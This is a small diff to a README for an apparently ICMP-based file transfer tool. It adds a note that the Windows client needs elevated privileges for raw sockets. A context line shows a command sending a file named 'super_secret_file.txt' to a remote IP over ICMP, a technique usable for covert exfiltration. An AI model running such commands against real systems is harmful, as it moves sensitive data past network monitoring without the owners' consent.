@@ -49,6 +49,9 @@ Example (on a Windows client):
 .\icmpClient.exe -t "192.168.86.10" -f "C:\super_secret_file.txt"
 ```
 
+> [!IMPORTANT]
+> On Windows, the client needs to be run with elevated privileges since you need access to raw sockets. Elevated privileges are not required on Linux since ICMP can be used with `udp4`.
+
 # Full Usage
 
 ## Server
